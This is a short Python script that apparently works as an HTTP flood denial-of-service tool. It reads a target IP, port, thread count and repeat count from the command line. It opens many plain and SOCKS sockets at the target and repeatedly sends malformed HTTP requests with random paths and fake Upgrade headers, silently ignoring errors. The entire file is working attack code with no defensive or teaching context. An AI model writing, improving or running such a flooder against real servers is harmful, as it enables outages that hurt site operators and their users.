import random,socks,socket,threading,sys,string

def path(length):
    path = ''
    for _ in range(length):
     p = (str(random.choice([1,2,3,4,5,6,7])) for _ in range(random.randint(1,3)))
     p = ''.join(p)
     path += '/'+p
    return path

def rapid_upgrade(length=5):
   protocol = ''
   for _ in range(length):
      proto = ''.join(str(random.choice(string.ascii_uppercase)) for _ in range(random.randint(1,4)))
      ver = '.'.join(str(random.choice([0,1,2,3,4,5,6,7,8,9])) for _ in range(2))
      protocol += proto+'/'+ver+', '
   if protocol.endswith(', '):
      protocol = protocol[:-2]
   return protocol

def http_rap(ip,port,time,booter,methods):
   length = 1; p = '\n\r'
   for _ in range(time):
      try:
         s = socket.socket()
         s.connect((ip,port)); s.connect_ex((ip, port))
         s2 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s2.connect((ip,port)); s2.connect_ex((ip, port))
         s3 = socket.create_connection((ip,port))
         s4 = socks.socksocket()
         s4.connect((ip,port)); s4.connect_ex((ip, port))
         packet = f'{methods} {path(length)} HTTP/1.1\nHost: {ip}\nConnection: upgrade\nUpgrade: {rapid_upgrade()}\nOrigin: http://{ip}:{port}\nClear-Site-Data: "*"\nRetry-After: 0\n{"".join([random.choice((p)) for _ in range(4)])}'.encode()
         for _ in range(booter):
            s.send(packet);s.sendall(packet)
            s2.send(packet);s2.sendall(packet)
            s3.send(packet);s3.sendall(packet)
            s4.send(packet);s4.sendall(packet)
      except:pass
      length += 1

ip = sys.argv[1]
port = int(sys.argv[2])
times = int(sys.argv[3])
threader = int(sys.argv[4])
booter = int(sys.argv[5])
methods = sys.argv[6]
for _ in range(threader):
   threading.Thread(target=http_rap,args=(ip,port,times,booter,methods)).start()